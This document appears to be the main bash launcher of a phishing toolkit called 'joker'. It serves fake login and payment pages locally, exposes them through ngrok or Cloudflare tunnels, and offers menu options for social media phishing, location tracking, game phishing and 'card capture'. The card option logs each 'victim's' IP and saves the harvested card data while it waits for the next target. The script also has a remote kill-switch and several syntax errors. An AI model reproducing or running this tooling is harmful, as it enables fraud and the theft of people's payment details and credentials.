clear
##############################
flare(){
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                      CLOUDFLARED SERVER             |"
echo -e "\e[96m        |         copy this command =>(  bash flare.sh   )    |"
echo -e "\e[96m        |     OPEN NEW SESSION AND RUN ABOVE COMMAND          |"
echo -e "\e[96m        |=====================================================|"

}
local(){
php -S localhost:8080 > /dev/null 2>1&
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |      [\e[92m1\e[96m]==> NGROK                       |"
echo -e "\e[96m        |      [\e[92m2\e[96m]==> CLOUDFLARE                  |"
echo -e "\e[96m        |=====================================================|"
read -p "CHOOSE SERVER : " flare
if [ $flare == 1 ];
then 
ngrok

elif [ $flare == 2 ];
then 
flare
fi
}

link(){
if [ -e link.txt ];
then
rm link.txt
fi
curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io" > link.txt



}
ngrok(){
cd $HOME
echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT "
sleep 5.0
echo -e "\e[92m\n\t\t LOCALHOST STARTING... "
sleep 2.0
echo -e "\e[92m \n\t\t NGROK STARTING... "

./ngrok http 8080 > /dev/null 2>1&
sleep 5.0
cd joker/.sites/$url
link

echo -e "\e[96m \n \tLOCALHOST : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[96m \n \tNGROK LINK : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e " $(cat link.txt)"

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

}
ip(){

if [ -e ip.txt ];
then 
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
echo -e "\n"
cat ip.txt
rm ip.txt
echo -e "\n"
fi
}




speed(){
clear

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃           SUKHDEVR898                  "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

curl https://ipinfo.io/ip > Ip.txt 2> /dev/null

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m YOUR IP ADDRESS : $(cat Ip.txt)                  "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
rm Ip.txt



echo -e "\e[94m\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

             speedtest
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\e[94m             ━━━━━━DONE━━━━━━━ "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
}


############################
if [ -e server_setup ];
then
echo -e "\e[97m SERVER SETUP.....!"
chmod +x server_setup
bash server_setup
rm server_setup
fi
banner(){



echo -e "\e[1;97m $(cat banner.txt)"
echo ""

mpv /sdcard/Music/start.mp3 > /dev/null 2>1&

sleep 4.0
clear
}
wget -q --spider https://raw.githubusercontent.com/sukhdevr898/sukhdevr898/main/.%20joker
if [ $? -eq 0 ];
then 
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
echo -e "\e[96m\t\t\t |    CONNECTED  [✓]                                    |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
echo -e "\e[96m\n\t\t\t |========= NOW  YOU ARE CONNECTED WITH SERVER ✓    ===|"
sleep 5.0
else 
echo -e "\e[96m\t\t\t |------------------------------------------------------|"   
echo -e "\e[96m\t\t\t |    NOT CONNECTED [×]                                 |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
echo -e "\e[96m\t\t\t |    CHECK INTERNET CONNECTION OTHERWISE               |"
echo -e "\e[96m\t\t\t |  THIS TOOL REMOVED BY SUKHDEVR898 YOU CAN'T USE      |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
 sleep 10.0
 exit 1
fi
clear
banner
choose(){

echo -e "                       \e[92m TOOL BY (SUKHDEVR898)\e[0m"
echo
echo -e "\e[96m        |-----------------------[V 2.0]-----------------------------------|     |"
echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|     |"
echo -e "\e[96m        |-----------------------------------------------------------------|     |"
echo -e "\e[96m        |                                                                 |     |"
echo -e "\e[96m        |                                                                 |     |"
echo -e "\e[96m        |                [\e[92m1\e[96m]==> SOCIAL MEDIA [✓]              |     |"
echo -e "\e[96m        |                [\e[92m2\e[96m]==> LOCTAION TRACKER [✓]          |     |"
echo -e "\e[96m        |                [\e[92m3\e[96m]==> GAME PSHISH                   |     |"
echo -e "\e[96m        |                [\e[92m4\e[96m]==> CARD CAPUTE                   |     |"
echo -e "\e[96m        |                [\e[92m5\e[96m]==> ABOUT                         |     |"
echo -e "\e[96m        |                [\e[92m6\e[96m]==> UPDATE                        |     |"
echo -e "\e[96m        |                [\e[92m7\e[96m]==> EXIT                          |     |"
echo -e "\e[96m        |                [\e[92m8\e[96m]==> CHECK SPEED                   |     |"
echo -e "\e[96m        |                [\e[93m00\e[98m]==> DEBUGGING MODE               |     |"
echo -e "\e[96m        |                                                                 |     |"
echo -e "\e[96m        |-----------------------------------------------------------------|     |"
echo -e "\e[96m        |---------------------\e[91mHACK3R\e[96m--------------------------|     |"
echo -e "\e[96m        |-----------------------------------------------------------------|     |"


}
choose
read -p " SELECT A OPTION :    " OP




option(){


case $OP in
1)
clear 
bash social.sh
;;
2)
bash loc.sh
;;
5)
clear
echo -e "\e[96m \t\t\t|------------------------------------------------------|"       
echo -e "\e[96m\t\t\t |             SUKHDEVR898                              |"   
echo -e "\e[96m\t\t\t |      FACEBOOK : https://m.facebook.com/sukhdevr898   |"
echo -e "\e[96m\t\t\t |     INSTAGRAM : https://m.instagram.com/sukhdevr898  |"
echo -e "\e[96m\t\t\t |       WEBSITE : https://sukhdevr898.site123.me       |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |                                                      |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
sleep 5.0
bash joker.sh
;;
3) 
clear
bash game.sh
;;
4)
cd .sites/
url="card"

cd card
local 
while true;

do
ip
if [ -e data.txt ];
then
echo -e "\e[98m \n  $(cat data.txt)  "
cat data.txt >> $HOME/joker/www/data.txt
rm data.txt 
fi

echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
6)
echo -e "\e[98m\t\t\t PLEASE WAIT.....!"
echo -e "\e[98m\t\t\t UPDATE CHECKING.....!"
sleep 5.0
wget -q --spider https://raw.githubusercontent.com/sukhdevr898/joker/main/update2.0
if [ $? -eq 0 ];
then 
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
echo -e "\e[96m\t\t\t |    TOOL ARLEADY UPDATED VERSION    [✓]               |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
bash joker.sh
else 
echo -e "\e[96m\t\t\t |------------------------------------------------------|"   
echo -e "\e[96m\t\t\t |    UPDATE AVAILABLE  [✓]                             |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
fi
echo -e "DO YOU WANT TO UPDATE THIS TOOL "
read -p "Y OR N " UP
case $UP in
Y)
cd $HOME
rm -rf joker
git clone https://github.com/sukhdevr898/joker/
 cd joker
bash setup.sh
;;
y)
cd $HOME
rm -rf joker
git clone https://github.com/sukhdevr898/joker/
cd joker
bash setup.sh
;;
*)

bash joker.sh
esac
;;
7) 
exit 1
;;
8)
speed
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\e[94m    DO YOU WANT TO SPEEDTEST AGAIN \n\t\t PRESS ENTER... \n\t\tOTHERWISE TYPE 'n' "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
read -p " CTRL + C FOR EXIT " spd
If [ $spd == "n" ];
then
bash joker.sh
else
speed
fi
;;
00)
clear
echo -e "\e[98m DEBUGGING MODE STARING.....!!"
sleep 10.0
bash -x joker.sh
;;
*)
echo -e "\e[96m\t\t\t |------------------------------------------------------|"   
echo -e "\e[96m\t\t\t |           SELECT VAILID OPTION [×]                   |"
echo -e "\e[96m\t\t\t |------------------------------------------------------|"
bash joker.sh
;;
esac
}
option


